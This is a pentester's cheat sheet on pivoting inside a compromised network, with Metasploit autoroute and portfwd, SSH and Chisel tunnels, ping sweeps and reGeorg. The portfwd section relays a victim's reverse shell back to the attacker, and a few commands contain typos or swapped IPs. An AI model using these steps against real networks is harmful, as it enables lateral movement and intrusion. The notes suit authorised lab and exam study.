# Routing
## In msfconsole
Autoroute (inside meterpreter session)
- Location: "/usr/share/metasploit-framework/modules/post/multi/manage/autoroute.rb"

run autoroute -s 10.10.10.0/20 

route add (Inside msfconsole)
- Location: "/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/route.rb"

route add 10.10.10.0 255.255.255.0 1,2,3(session id)





# Proxy
## SSH Proxy
- Execute following command on the compromised machine
- Proxy service will be on port 4444 of the attacking machine(ssh executing machine)
-  Use either with proxychain sock4 or other alternatives

ssh -D 4444 compromised_machine@192.168.1.110






## Chisel Proxy
https://www.youtube.com/watch?v=pbR_BNSOaMk
### Chisel Reverse
- Execute following command on the compromised machine

chisel server --socks5 --reverse

- Chisel server will be on port 8080 of the attacking machine(chisel command executing machine)
- Connect back from compromised machine via Fingerprint generated from server command

chisel client --fingerprint "       " 192.168.1.100:8080 R:socks

### Chisel Direct
- Use for reverse-shell connections

chisel client --fingerprint "       " 192.168.1.100:8080 0.0.0.0:9999:192.168.1.100:9999 (without 0.0.0.0 also works)








# Metasploit PortForwarding and Getting ReverseShell Instead of Bindshell
- Need meterpreter session on compromised machine
- Route traffic inside internal network

portfwd add -R -L 10.10.16.3(attacking machine ip) -l 8888(attacking machine port) -p 7777(compromised machine 1 port) -r 10.0.24.164(compromised machine 1)

- Open another msfconsole with multi/handler and set lhost to 0.0.0.0(attacking machine) , set lport to 8888(attacking machine port)
- In revershell payload set lhost to 10.0.24.164(compromised machine 1) set lport to -p 7777(compromised machine 1 port)
- What happened is when victim connect reverse shell back, it connect to compromised machine 1 first on port 7777, but it is forwarded to 0.0.0.0(attacking machine) on port 8888 and got the connection.






# SSH Port Forwarding 

## Discovering Alive Hosts from Compormised Machine

metasploit windows/gather/arp_scanner

### Window
powershell

1..254 | ForEach-Object { $ip = "192.168.1.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Output "$ip is reachable" } else { Write-Output "$ip is unreachable" } }


### Linux

for i in {1..254}; do ping -c1 -W1 192.168.1.${i} & done | grep










# Important!!
- Please take note 192.168.1.100 as attacking machine(my machine) , 192.168.1.110 as compromised machine(victim 1), 192.168.2.100 as internal machine(victim 2)
## Direct 
- You want to access a web server running on 192.168.2.100 on port 80 through compromised machine 192.168.1.100
- Take note that !!! 8080 "-L 8080:" !!! is ssh command executing machine localhost port 

ssh -L 8080:192.168.2.100:80 compromised_machine@192.168.1.100


## Reverse

- You want to make a localhost port 80 of your "ssh command executing machine(attacking machine)192.168.1.100" accessible from 192.168.1.110(compromised machine) on port 8080.


ssh -R 8080:localhost:80 compromised_machine@192.168.1.100


# Chisel Port Forwarding
- First host a chisel server to listen on attacking machine

chisel server --sock5 --reverse

- Make magic in compromised machine(victim 1)
- Making the victim2's port 80 accessible from the attacking machine's port 8000 (Same as SSH -L) port forwarding

chisel client --fingerprint "fingerprint_generated_from_attacking_machine" 192.168.1.100:8080(ip and port of server) R:8000:192.168.2.100:80







# reGeorg (Used for unprivileged user compromised)

- On attacker machine
- On victim machine, upload tunnel.php

python reGeorgproxy.py -p 9050 -u http://ipaddress:port/
